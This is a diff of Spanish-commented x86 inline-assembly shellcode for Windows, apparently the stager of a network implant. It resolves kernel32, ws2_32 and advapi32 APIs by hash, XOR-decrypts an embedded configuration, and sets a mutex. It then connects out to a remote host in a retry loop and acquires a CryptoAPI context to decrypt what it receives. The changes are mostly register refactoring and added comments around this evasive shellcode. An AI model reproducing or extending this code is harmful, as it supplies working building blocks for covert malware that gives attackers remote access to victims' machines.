@@ -6,9 +6,6 @@
 **    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
 *###############################################################################*/
 
-#pragma comment(linker,"/SUBSYSTEM:WINDOWS,5.00")
-#pragma comment(linker,"/OSVERSION:5.00")
-
 //No queremos que muestre el warning de etiqueta sin referencia, 
 //ya que las usamos para mejorar la legibilidad del código
 #pragma warning(disable:4102)
@@ -228,15 +225,17 @@ next_module:
         jne  next_module
 find_kernel32_finished:
 
-        movr(ecx, LoadFunctions)        // Puntero a LoadFunctions()
+#ifdef SC_DELTA
+        push edi                        //Guardamos el Delta
+#endif
         movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
+        movr(edi, LoadFunctions)        // Puntero a LoadFunctions()
 
         //Cargamos las APIs de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
-        call ecx                        //>LoadFunctions(kernel32_count);
+        call edi                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA]//EBX = &LoadLibraryA
 
-        push ecx
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
         pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
@@ -244,27 +243,27 @@ find_kernel32_finished:
         call ebx                        //>LoadLibraryA("ws2_32");
         pop  edx                        //v
         pop  edx                        //>Restauramos la pila sacando la cadena ANSI
-        pop  ecx
 
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
         push ws2_32_count               //v Número de hashes de ws2_32
-        call ecx                        //>LoadFunctions(ws2_32_count);
+        call edi                        //>LoadFunctions(ws2_32_count);
 
         //Obtenemos el BaseAddress de advapi32
         cdq                             //EDX = 0
-        push ecx                        //Guardamos ECX (LoadFunctions()) en el Stack
         push edx                        //v
         pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
         pushc('avda')                   //v
         push esp                        //v
         call ebx                        //>LoadLibraryA("advapi32");
         add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
-        pop  ecx                        //Recuperamos el puntero a LoadFunctions()
 
         push advapi32_count             //v Número de hashes de advapi32
-        call ecx                        //>LoadFunctions(advapi32_count);
+        call edi                        //>LoadFunctions(advapi32_count);
 
         add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
+#ifdef SC_DELTA
+        pop  edi                        //Recuperamos el Delta
+#endif
         //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4
 
@@ -278,14 +277,14 @@ find_kernel32_finished:
 
 #pragma region DECRYPT_CONFIG
         push PACKET_CONFIG_COUNT        //v
-        pop  ecx                        //>ECX = Cantidad de bloques de 8 en config
+        pop  ecx                        //>ECX = i = Cantidad de bloques de 8 en config
 xornext:
-        lea  ebx, [esi+(ecx*8)-8]
-        movq mm0, QWORD PTR[ebx]
-        pxor mm0, mm7
-        movq QWORD PTR[edx], mm0
-        add  edx, 8
-        loop xornext
+        lea  ebx, [esi+(ecx*8)-8]       //EBX = &(QWORD)config_start[i]
+        movq mm0, QWORD PTR[ebx]        //MM0 = (QWORD)*EBX
+        pxor mm0, mm7                   //MM0^= MM7
+        movq QWORD PTR[edx], mm0        //*(QWORD)Buffer = MM0
+        add  edx, 8                     //Buffer+=8
+        loop xornext                    //i-=1
 #pragma endregion
 
         //Guardamos los punteros a los valores descifrados
@@ -300,9 +299,10 @@ xornext:
         push edx                        //v
         push edx                        //v
         call [ebp+_CreateMutexA]        //>CreateMutexA(NULL, False, &MUTEX)
-        cdq                             //EDX = 0
-        mov  edx, DWORD PTR FS:[edx+0x18]//v
-        mov  eax, [edx+0x34]            //>GetLastError()
+        push 0x18                       //v
+        pop  esi                        //v
+        lods DWORD PTR FS:[esi]         //>EAX = &(TEB)
+        mov  eax, [eax+0x34]            //>GetLastError()
 #ifdef ERR_CHECK
         xor  al, 0xB7
         push ERR_MTX
@@ -358,6 +358,7 @@ _cont:  xor  eax, eax                   //EAX = 0
         **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
         *###############################################################################*/
 
+newSocket:
         //Iniciamos el socket
         xor  ebx, ebx                   //EBX = 0
         mov  bl, 0x19                   //EBX = 0x19
@@ -373,9 +374,8 @@ _cont:  xor  eax, eax                   //EAX = 0
         call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
         add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ésta
 
-newSocket:
         //Creamos el socket AF_INET y SOCK_STREAM
-        xor  edx, edx                   //EDX = 0
+        cdq                             //EDX = 0
         push edx                        //v
         push edx                        //v
         push edx                        //v
@@ -417,7 +417,8 @@ connect_loop:
         push ebx                        //v
         push [ebp+_hSocket]             //v
         call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
-        add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in
+        pop  ebx                        //v
+        pop  ebx                        //>Reparamos la pila eliminando sockaddr_in
         test eax, eax                   //v
         jl   sleep_and_loop             //>(EAX<0)? (Error, reseteemos)
 connected:
@@ -460,8 +461,8 @@ init_decrypt:
         //Adquirimos el handle para trabajar con el CSP deseado.
         cdq                             //EDX = 0
 #ifdef SC_NULL
-        push 0x0F
-        shl  DWORD PTR[esp], 0x1C
+        push 0x0F                       //v
+        shl  DWORD PTR[esp], 0x1C       //v
 #else //SC_NULL
         push CRYPT_VERIFYCONTEXT        //v
 #endif //SC_NULL
